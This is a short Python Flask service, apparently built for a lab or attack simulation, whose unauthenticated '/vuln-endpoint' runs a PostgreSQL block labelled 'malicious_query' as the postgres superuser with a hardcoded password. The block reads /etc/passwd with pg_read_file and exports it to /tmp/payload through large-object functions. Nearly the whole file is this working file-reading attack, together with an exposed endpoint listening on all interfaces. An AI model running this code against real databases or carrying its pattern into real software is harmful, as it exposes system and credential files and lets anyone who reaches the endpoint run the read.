from flask import Flask, request
import subprocess
import os

app = Flask(__name__)

@app.route('/vuln-endpoint', methods=['POST'])
def vuln_endpoint():
    try: 
        user_input = request.form.get('input', '')

        malicious_query=f"""
        DO $$
        DECLARE
            l_oid oid; 
            l_fd integer; 
        BEGIN
            l_oid := lo_create(0); 
            l_fd := lo_open(l_oid, 131072); 
            PERFORM lowrite(l_fd, pg_read_file('/etc/passwd')::bytea); 
            PERFORM lo_close(l_fd);
            PERFORM lo_export(l_oid, '/tmp/payload');
        END $$;
            """

        cmd = ["psql",
        "-h", "db",
        "-U", "postgres",
        "-c", malicious_query
        ]
                    
        env = os.environ.copy()
        env["PGPASSWORD"] = "example"

        result = subprocess.run(cmd, env=env, capture_output=True, text=True)

        return {
         "status":"executed",
         "stdout":result.stdout, 
         "stderr":result.stderr
        }
    except Exception as e:
        return {"error": str(e)}, 500
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
